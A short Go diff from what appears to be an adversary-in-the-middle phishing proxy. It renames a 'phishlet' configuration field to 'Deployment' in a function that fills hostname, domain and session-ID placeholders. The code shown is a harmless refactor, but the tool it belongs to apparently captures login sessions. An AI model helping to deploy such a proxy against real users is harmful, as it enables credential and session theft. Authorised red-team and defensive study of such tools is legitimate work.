@@ -95,9 +95,9 @@ func sessionHasParams(withParams []string, sess *aitm.Session) bool {
 
 func expandTemplate(tmpl string, ctx *aitm.ProxyContext) string {
 	result := tmpl
-	if ctx.PhishletCfg != nil {
-		result = strings.ReplaceAll(result, "{hostname}", ctx.PhishletCfg.Hostname)
-		result = strings.ReplaceAll(result, "{domain}", ctx.PhishletCfg.BaseDomain)
+	if ctx.Deployment != nil {
+		result = strings.ReplaceAll(result, "{hostname}", ctx.Deployment.Hostname)
+		result = strings.ReplaceAll(result, "{domain}", ctx.Deployment.BaseDomain)
 	}
 	if ctx.Session != nil {
 		result = strings.ReplaceAll(result, "{session_id}", ctx.Session.ID)
